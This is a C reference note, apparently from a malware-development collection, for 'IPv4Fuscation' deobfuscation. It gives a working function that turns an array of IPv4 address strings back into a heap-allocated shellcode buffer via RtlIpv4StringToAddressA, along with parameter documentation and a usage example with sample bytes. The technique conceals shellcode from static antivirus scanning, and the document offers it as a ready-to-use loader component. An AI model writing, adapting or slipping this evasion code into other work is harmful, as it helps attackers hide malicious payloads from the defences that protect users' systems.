## Shellcode IPv4Fuscation — Deobfuscation

Converts an array of IPv4 address strings back into the original shellcode byte buffer using the NTAPI `RtlIpv4StringToAddressA`. Each IPv4 address is resolved into 4 bytes, and all resolved bytes are written sequentially into a heap-allocated output buffer. The number of elements in the array multiplied by 4 gives the recovered shellcode size.

**Usage**

Call `Ipv4Deobfuscation` with the IPv4 string array, its element count, and two `OUT` pointers that receive the deobfuscated shellcode buffer and its size. The output buffer is heap-allocated by the function; the caller is responsible for freeing it with `HeapFree`.

- `IN CHAR* Ipv4Array[]`  Array of IPv4 address strings produced by `GenerateIpv4Output`.
- `IN SIZE_T NmbrOfElements`  Number of IPv4 address strings in `Ipv4Array`.
- `OUT PBYTE* ppDAddress`  Receives the base address of the heap-allocated deobfuscated shellcode buffer.
- `OUT SIZE_T* pDSize`  Receives the size of the deobfuscated shellcode buffer in bytes (`NmbrOfElements * 4`).

**Return Value**

`BOOL`  Returns `TRUE` if deobfuscation succeeds and `ppDAddress` / `pDSize` are populated, otherwise `FALSE`.

### Code

```c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR   S,          // The IPv4 address string to convert.
    BOOLEAN Strict,     // If TRUE enforces strict dotted-decimal format.
    PCSTR*  Terminator, // Receives a pointer to the character that terminated the scan.
    PVOID   Addr        // Output: receives the 4-byte binary IPv4 address.
);


BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize)
{
    PBYTE    pBuffer    = NULL,
             TmpBuffer  = NULL;
    SIZE_T   sBuffSize  = NULL;
    PCSTR    Terminator = NULL;
    NTSTATUS STATUS     = NULL;

    // Resolve RtlIpv4StringToAddressA from ntdll.dll at runtime.
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(
        GetModuleHandle(TEXT("NTDLL")),     // ntdll.dll is always loaded in every process.
        "RtlIpv4StringToAddressA"           // Converts an IPv4 string to a 4-byte binary address.
    );
    if (pRtlIpv4StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Each IPv4 address deobfuscates to exactly 4 bytes.
    sBuffSize = NmbrOfElements * 4;

    pBuffer = (PBYTE)HeapAlloc(
        GetProcessHeap(),   // Use the process default heap.
        0,                  // No flags.
        sBuffSize           // Total size of the recovered shellcode.
    );
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // TmpBuffer walks forward through pBuffer by 4 bytes per iteration.
    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscate one IPv4 address string into 4 bytes written at TmpBuffer.
        if ((STATUS = pRtlIpv4StringToAddressA(
            Ipv4Array[i],   // Single IPv4 string from the obfuscated array.
            FALSE,          // Non-strict: tolerates leading zeros in octets.
            &Terminator,    // Receives pointer to the first character past the address.
            TmpBuffer       // Output: 4 deobfuscated bytes written here.
        )) != 0x0) {
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
            return FALSE;
        }

        // Advance the write cursor by 4 bytes to avoid overwriting recovered bytes.
        TmpBuffer = (PBYTE)(TmpBuffer + 4);
    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;

    return TRUE;
}
```

**Example**

```c
// Array produced by the Obfuscation note — 2 IPv4 strings = 8 recovered bytes.
CHAR*  Ipv4Array[]      = { "252.72.131.228", "240.229.226.80" };
SIZE_T NmbrOfElements  = sizeof(Ipv4Array) / sizeof(Ipv4Array[0]);

PBYTE  pDAddress = NULL;
SIZE_T pDSize     = 0;

// Recover the original shellcode into a heap-allocated buffer.
if (Ipv4Deobfuscation(Ipv4Array, NmbrOfElements, &pDAddress, &pDSize)) {
    HeapFree(GetProcessHeap(), 0, pDAddress);  // Caller frees.
}
```
